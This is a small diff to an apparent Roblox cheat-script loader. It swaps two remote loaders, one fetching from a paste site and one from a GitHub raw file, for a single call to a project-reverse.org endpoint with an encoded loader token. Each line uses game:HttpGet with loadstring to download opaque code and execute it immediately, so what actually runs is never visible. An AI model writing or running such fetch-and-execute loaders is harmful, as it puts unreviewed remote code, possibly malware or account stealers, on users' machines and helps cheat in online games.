@@ -1,9 +1,1 @@
-local function farm()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/3ip6CEEHtB/0", true))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/farm/refs/heads/main/farm.lua'))()
-end
-
-task.spawn(farm)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImQ2ZGVhY2NiLTllMDItNDk0ZC04OTc0LWE0M2I1MjY3ZjRkZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
